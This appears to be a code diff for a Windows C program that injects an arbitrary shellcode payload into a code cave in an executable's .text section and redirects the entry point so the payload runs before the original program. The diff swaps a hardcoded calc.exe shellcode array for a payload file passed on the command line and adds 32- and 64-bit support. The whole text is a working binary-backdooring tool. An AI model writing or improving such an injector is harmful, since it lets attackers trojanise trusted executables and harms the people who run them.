@@ -1,22 +1,23 @@
 #include <windows.h>
 #include <stdio.h>
+#include <string.h>
+#include "BinToArray/converter.h"
 
-int main() {
-    // calc.exe shellcode
-    unsigned char payload[] = {
-        0x31,0xC0,0x50,0x68,0x63,0x61,0x6C,0x63,0x54,0x59,0x50,0x40,0x92,0x74,0x15,0x51,
-        0x64,0x8B,0x72,0x2F,0x8B,0x76,0x0C,0x8B,0x76,0x0C,0xAD,0x8B,0x30,0x8B,0x7E,0x18,
-        0xB2,0x50,0xEB,0x1A,0xB2,0x60,0x48,0x29,0xD4,0x65,0x48,0x8B,0x32,0x48,0x8B,0x76,
-        0x18,0x48,0x8B,0x76,0x10,0x48,0xAD,0x48,0x8B,0x30,0x48,0x8B,0x7E,0x30,0x03,0x57,
-        0x3C,0x8B,0x5C,0x17,0x28,0x8B,0x74,0x1F,0x20,0x48,0x01,0xFE,0x8B,0x54,0x1F,0x24,
-        0x0F,0xB7,0x2C,0x17,0x8D,0x52,0x02,0xAD,0x81,0x3C,0x07,0x57,0x69,0x6E,0x45,0x75,
-        0xEF,0x8B,0x74,0x1F,0x1C,0x48,0x01,0xFE,0x8B,0x34,0xAE,0x48,0x01,0xF7,0x99,0xFF,
-        0xD7
-    };
-    
-    const int payloadSize = sizeof(payload);
+int main(int argc, char *argv[]) {
+    if (argc < 3) {
+        fprintf(stderr, "Usage: %s <binary file> <bin payload>\n", argv[0]);
+        return 1;
+    }
 
-    const char* filename = "./test-32.exe";
+    const char* payloadFilename = argv[2];
+    size_t payloadSize = 0;
+    unsigned char* payload = convert_bin_to_array(payloadFilename, &payloadSize);
+    if (payload == NULL) {
+        fprintf(stderr, "Conversion of %s failed.\n", payloadFilename);
+        return 1;
+    }
+
+    const char* filename = argv[1];
 
     HANDLE hFile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
@@ -40,16 +41,36 @@ int main() {
 
     char* pData = (char*)pMapView; // Pointer to the start of the file
     IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pData;
-    IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)(pData + pDosHeader->e_lfanew); // e_lfanew offset to NT header
-    IMAGE_OPTIONAL_HEADER* pOptionalHeader = &pNtHeader->OptionalHeader;
+    PBYTE pNtHeaderBase = (PBYTE)(pData + pDosHeader->e_lfanew);
+
+    DWORD originalEntryRVA = 0;
+    WORD numberOfSections = 0;
+    IMAGE_SECTION_HEADER* firstSection = NULL;
+
+    if (((PIMAGE_NT_HEADERS32)pNtHeaderBase)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+        IMAGE_NT_HEADERS32* pNtHeader32 = (IMAGE_NT_HEADERS32*)pNtHeaderBase;
+        originalEntryRVA = pNtHeader32->OptionalHeader.AddressOfEntryPoint;
+        numberOfSections = pNtHeader32->FileHeader.NumberOfSections;
+        firstSection = IMAGE_FIRST_SECTION(pNtHeader32);
+
+        printf("Binary Architecture: 32-bit\n");
+    } else if (((PIMAGE_NT_HEADERS64)pNtHeaderBase)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        IMAGE_NT_HEADERS64* pNtHeader64 = (IMAGE_NT_HEADERS64*)pNtHeaderBase;
+        originalEntryRVA = pNtHeader64->OptionalHeader.AddressOfEntryPoint;
+        numberOfSections = pNtHeader64->FileHeader.NumberOfSections;
+        firstSection = IMAGE_FIRST_SECTION(pNtHeader64);
+
+        printf("Binary Architecture: 64-bit\n");
+    } else {
+        printf("Unknown PE format\n");
+        return 1;
+    }
+
     IMAGE_SECTION_HEADER* textSectionHeader = NULL;
-
-    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
-        IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)(pNtHeader + 1) + i;
-
-        if (strcmp((char*)section->Name, ".text") == 0) {
+    for (int i = 0; i < numberOfSections; i++) {
+        IMAGE_SECTION_HEADER* section = firstSection + i;
+        if (strncmp((char*)section->Name, ".text", 5) == 0) {
             textSectionHeader = section;
-
             break;
         }
     }
@@ -61,10 +82,7 @@ int main() {
     
     unsigned char* textRawData = (unsigned char*)(pData + textSectionHeader->PointerToRawData);
     DWORD textSizeRawData = textSectionHeader->SizeOfRawData;
-
-    DWORD originalEntryRVA = pOptionalHeader->AddressOfEntryPoint;
     DWORD originalEntryRaw = textSectionHeader->PointerToRawData + (originalEntryRVA - textSectionHeader->VirtualAddress);
-    unsigned char* originalEntryPoint = pData + originalEntryRaw;
     
     printf("Original entry point: 0x%X (Raw: 0x%X)\n", originalEntryRVA, originalEntryRaw);
     
@@ -97,8 +115,12 @@ int main() {
     memcpy(jmpBackToEntryPoint + 1, &jmpBackOffset, sizeof(DWORD));
     memcpy(textRawData + caveStartOffset + payloadSize, jmpBackToEntryPoint, sizeof(jmpBackToEntryPoint));
 
-    pOptionalHeader->AddressOfEntryPoint = textSectionHeader->VirtualAddress + caveStartOffset;
-    printf("Patched entry point: 0x%X\n", pOptionalHeader->AddressOfEntryPoint);
+    if (((PIMAGE_NT_HEADERS32)pNtHeaderBase)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+        ((PIMAGE_NT_HEADERS32)pNtHeaderBase)->OptionalHeader.AddressOfEntryPoint = textSectionHeader->VirtualAddress + caveStartOffset;
+    } else {
+        ((PIMAGE_NT_HEADERS64)pNtHeaderBase)->OptionalHeader.AddressOfEntryPoint = textSectionHeader->VirtualAddress + caveStartOffset;
+    }
+    printf("Patched entry point: 0x%X\n", textSectionHeader->VirtualAddress + caveStartOffset);
 
     UnmapViewOfFile(pMapView);
     CloseHandle(hMapFile);
